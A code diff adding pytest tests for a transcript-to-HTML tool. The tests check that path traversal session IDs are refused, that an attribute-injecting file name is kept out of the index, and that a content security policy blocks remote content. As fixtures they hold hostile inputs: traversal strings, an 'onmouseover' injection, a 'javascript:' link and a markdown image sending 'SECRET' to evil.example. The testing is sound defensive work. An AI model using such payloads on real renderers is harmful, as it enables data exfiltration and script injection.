@@ -72,6 +72,67 @@ def test_html_in_replies_is_escaped(tmp_path):
     assert "<script>alert(1)" not in page and "&lt;script&gt;" in page
 
 
+def one_reply(tmp_path):
+    t = tmp_path / "s.jsonl"
+    transcript(t, [line(type="user", timestamp="2026-11-07T22:00:00Z", message={"content": "hi"}),
+                   line(type="assistant", timestamp="2026-11-07T22:00:01Z", message={"content": [{"type": "text", "text": "yo"}]})])
+    return t
+
+
+def test_unsafe_session_ids_are_refused_before_any_path_is_built(tmp_path):
+    import pytest
+    rl = load(tmp_path)
+    t = one_reply(tmp_path)
+    before = {p for p in tmp_path.rglob("*")}
+    for sid in ["../x", "../../x", "a/b", "/abs/x", "..", ".hidden", "", "a\x00b", "x" * 200, "a b", "<img src=x>"]:
+        with pytest.raises(ValueError):
+            rl.run(t, sid, "")
+        with pytest.raises(ValueError):
+            rl.render_session(sid)
+    assert {p for p in tmp_path.rglob("*")} == before  # nothing created, inside or outside the folder
+    assert not (tmp_path / "x.jsonl").exists() and not (tmp_path / "x.html").exists()
+    assert rl.run(t, "0b1c2d3e-4f50-6789-abcd-ef0123456789", "") == 2  # a real session id still works
+
+
+def test_hostile_session_via_the_command_line_is_logged_not_fatal(tmp_path, monkeypatch):
+    rl = load(tmp_path)
+    t = one_reply(tmp_path)
+    monkeypatch.setattr(sys, "argv", ["reply_ledger.py", "--transcript", str(t), "--session", "../escape"])
+    assert rl.main() == 0
+    assert "unsafe session id" in (rl.STATE / "errors.log").read_text()
+    assert not (tmp_path / "escape.jsonl").exists() and not (tmp_path / "escape.html").exists()
+
+
+def test_odd_file_names_in_the_replies_folder_stay_out_of_the_index(tmp_path):
+    rl = load(tmp_path)
+    t = one_reply(tmp_path)
+    rl.run(t, "good", "")
+    (rl.OUT / 'a"onmouseover="x.jsonl').write_text('{"role": "user", "text": "z", "ts": "2026-11-07T22:00:00Z"}\n')
+    rl.render_index()
+    index = (rl.OUT / "index.html").read_text()
+    assert 'href="good.html"' in index and "onmouseover" not in index
+
+
+def test_pages_block_remote_content_and_pin_their_own_script(tmp_path):
+    import base64
+    import hashlib
+    import re
+    rl = load(tmp_path)
+    t = tmp_path / "s.jsonl"
+    transcript(t, [line(type="user", timestamp="2026-11-07T22:00:00Z", message={"content": "hi"}),
+                   line(type="assistant", timestamp="2026-11-07T22:00:01Z",
+                        message={"content": [{"type": "text", "text": "![x](https://evil.example/p.png?q=SECRET) [l](javascript:alert(1))"}]})])
+    rl.run(t, "s", "")
+    page = (rl.OUT / "s.html").read_text()
+    assert "default-src 'none'" in page and "img-src data:" in page
+    assert f"script-src 'sha256-{rl.js_hash()}'" in page
+    assert 'href="javascript:' not in page  # markdown-it refuses the scheme as well
+    inline = re.search(r"<script>(.*?)</script>", page, re.S).group(1)
+    assert base64.b64encode(hashlib.sha256(inline.encode()).digest()).decode() == rl.js_hash()
+    index = (rl.OUT / "index.html").read_text()
+    assert "default-src 'none'" in index and "script-src 'none'" in index
+
+
 def test_hook_never_fails(tmp_path, monkeypatch):
     rl = load(tmp_path)
     monkeypatch.setattr(sys, "argv", ["reply_ledger.py", "--hook"])
